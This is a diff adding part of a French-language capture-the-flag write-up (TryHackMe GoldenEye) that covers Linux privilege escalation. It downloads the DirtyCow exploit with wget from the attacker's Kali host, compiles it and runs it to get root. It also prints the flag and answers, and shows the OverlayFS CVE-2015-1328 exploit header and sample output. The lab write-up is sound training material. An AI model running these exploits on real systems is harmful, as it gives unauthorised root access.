@@ -581,3 +581,220 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ### <mark style="color:orange;">**Nous voilà entrés dans la machine**</mark>
+
+
+## \[Task 4] Privilege Escalation
+
+[Transférons les fichiers nécessaires de la machine Kali vers la machine cible](outils.md#transfert-de-fichiers) et utilisons [ma méthode générique d'analyse des possibilités de 'privilege escalation'.](outils.md#privilege-escalation)
+
+### sudo -l
+
+```
+www-data@ubuntu:/dev/shm$ sudo -l
+sudo -l
+[sudo] password for www-data:
+```
+
+Inexploitable
+
+### [suid3num.py](outils.md#privilege-escalation)
+
+<figure><img src=".gitbook/assets/suid3num-01.png" alt=""><figcaption><p>suid3num.py</p></figcaption></figure>
+
+Rien d'exploitable à première vue
+
+### [LES (Linux-Exploit-Suggester)](outils.md#privilege-escalation)
+
+Bien que le challenge nous indique d'utiliser la vulnérabilité OverlayFs, je préfère rester plus générique dans mon analyse et utiliser l'outil **les.sh.**
+
+Voici le résultat de **les.sh** suggérant des vulnérabilités exploitables dans l'ordre de leur probabilité d'exploitation
+
+<figure><img src=".gitbook/assets/les-total.png" alt=""><figcaption><p>Linux Exploits Suggester</p></figcaption></figure>
+
+### Kernel version
+
+```
+www-data@ubuntu:/dev/shm$ uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ubuntu:/dev/shm$ 
+
+```
+
+### Vunérabilités trouvées
+
+Les deux premières vulnérabilités de la liste (et donc les plus probables) sont:
+
+* DirtyCow
+* OverlayFs
+
+### Commençons par DirtyCow
+
+les.sh nous suggère [https://www.exploit-db.com/exploits/40611](https://www.exploit-db.com/exploits/40616). La lecture du mode d'emploi de l'exploit n'est pas évidente...
+
+Après une recherche sur la base de donnée [exploit.db](https://exploit-db.com)
+
+<figure><img src=".gitbook/assets/dirtycow01.png" alt=""><figcaption><p>Recherche dirtycow</p></figcaption></figure>
+
+je préfère utiliser [https://www.exploit-db.com/exploits/40616](https://www.exploit-db.com/exploits/40616) qui me paraît plus facile à utiliser
+
+<figure><img src=".gitbook/assets/dirtycow02.png" alt=""><figcaption><p>dirtycow mode d'emploi</p></figcaption></figure>
+
+le compilateur **gcc n'est pas installé**. À la place, nous pouvons utiliser **cc**, son équivalent UNIX.
+
+```
+www-data@ubuntu:/dev/shm$ gcc --version
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+www-data@ubuntu:/dev/shm$ 
+www-data@ubuntu:/dev/shm$ cc --version
+Ubuntu clang version 3.4-1ubuntu3 (tags/RELEASE_34/final) (based on LLVM 3.4)
+Target: x86_64-pc-linux-gnu
+Thread model: posix
+www-data@ubuntu:/dev/shm$ 
+```
+
+Téléchargeons et transférons le fichier 40616.c que j'ai renommé en dirtycow.c pour plus de clarté.
+
+Suivons pas à pas la mise en œuvre de l'exploit et ne nous préoccupons pas des 'warnings' générés.
+
+```sh
+www-data@ubuntu:/dev/shm$ wget 10.9.2.173:8000/dirtycow.c
+wget 10.9.2.173:8000/dirtycow.c
+--2024-10-08 01:06:39--  http://10.9.2.173:8000/dirtycow.c
+Connecting to 10.9.2.173:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4966 (4.8K) [text/x-csrc]
+Saving to: 'dirtycow.c'
+
+100%[======================================>] 4,966       --.-K/s   in 0s      
+
+2024-10-08 01:06:39 (674 MB/s) - 'dirtycow.c' saved [4966/4966]
+
+www-data@ubuntu:/dev/shm$ cc dirtycow.c -o cowroot -pthread
+dirtycow.c:91:1: warning: control reaches end of non-void function [-Wreturn-type]
+}
+^
+dirtycow.c:100:17: warning: incompatible pointer to integer conversion passing 'void *' to parameter of type '__off_t' (aka 'long') [-Wint-conversion]
+        lseek(f,map,SEEK_SET);
+                ^~~
+/usr/include/unistd.h:334:41: note: passing argument to parameter '__offset' here
+extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+                                        ^
+dirtycow.c:104:1: warning: control reaches end of non-void function [-Wreturn-type]
+}
+^
+dirtycow.c:129:1: warning: control reaches end of non-void function [-Wreturn-type]
+}
+^
+dirtycow.c:137:5: warning: implicit declaration of function 'asprintf' is invalid in C99 [-Wimplicit-function-declaration]
+    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+    ^
+dirtycow.c:141:5: warning: implicit declaration of function 'fstat' is invalid in C99 [-Wimplicit-function-declaration]
+    fstat(f,&st);
+    ^
+dirtycow.c:143:36: warning: format specifies type 'int' but the argument has type '__off_t' (aka 'long') [-Wformat]
+    printf("Size of binary: %d\n", st.st_size);
+                            ~~     ^~~~~~~~~~
+                            %ld
+7 warnings generated.
+www-data@ubuntu:/dev/shm$ ./cowroot
+./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 47032
+Racing, this may take a while..
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+thread stopped
+root@ubuntu:/run/shm# 
+
+```
+
+### <mark style="color:orange;">**Et voilà, mission accomplie: nous sommes root.**</mark>
+
+```
+root@ubuntu:/run/shm# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+root@ubuntu:/run/shm# cd /root
+cd /root
+root@ubuntu:/root# ls -la
+ls -la
+total 44
+drwx------  3 root root 4096 Apr 29  2018 .
+drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
+-rw-r--r--  1 root root   19 May  3  2018 .bash_history
+-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
+drwx------  2 root root 4096 Apr 28  2018 .cache
+-rw-------  1 root root  144 Apr 29  2018 .flag.txt
+-rw-r--r--  1 root root  140 Feb 19  2014 .profile
+-rw-------  1 root root 1024 Apr 23  2018 .rnd
+-rw-------  1 root root 8296 Apr 29  2018 .viminfo
+root@ubuntu:/root# cat .flag.txt
+cat .flag.txt
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+root@ubuntu:/root# 
+```
+
+Allons à la page /006-final/xvf7-flag/ et <mark style="color:red;">**boom...**</mark> :tada:
+
+<figure><img src=".gitbook/assets/flag.png" alt=""><figcaption></figcaption></figure>
+
+### Réponses aux questions
+
+| Question                  | Réponse                          |
+| ------------------------- | -------------------------------- |
+| Whats the kernel version? | 3.13.0-32-generic                |
+| What is the root flag?    | 568628e0d993b1973adc718237da6e93 |
+
+## \[ Bonus ] utilisation de overlay.fs exploit
+
+Le challenge préconise l'utilisation de overlay.fs [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)
+
+Dans ce cas-ci, il faudra utiliser le compilateur cc au lieu de gcc avec la subtilité supplémentaire qu'il faut remplacer **gcc** par **cc** dans le code source de l'exploit.
+
+<figure><img src=".gitbook/assets/ofs01.png" alt=""><figcaption><p>overlay.fs code source</p></figcaption></figure>
+
+Téléchargeons, transférons le fichier ofs.c vers la machine cible et exécutons l'exploit en suivant le mode d'emploi donné dans le code source
+
+```
+/*
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+# Date: 2015-06-15
+# Exploit Author: rebel
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
+
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+CVE-2015-1328 / ofs.c
+overlayfs incorrect permission handling + FS_USERNS_MOUNT
+
+user@ubuntu-server-1504:~$ uname -a
+Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+user@ubuntu-server-1504:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
+user@ubuntu-server-1504:~$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
+```
+
+Comme pour [DirtyCow](goldeneye-ctf-tryhackme.md#commencons-par-dirtycow), il ne faut pas se soucier des warnings.
+
+Voici ce que cela donne:
+
+<figure><img src=".gitbook/assets/ofs02.png" alt=""><figcaption><p>overlayFS exploit</p></figcaption></figure>
+
+<mark style="color:orange;">**Bingo, ici aussi, nous voilà root**</mark>
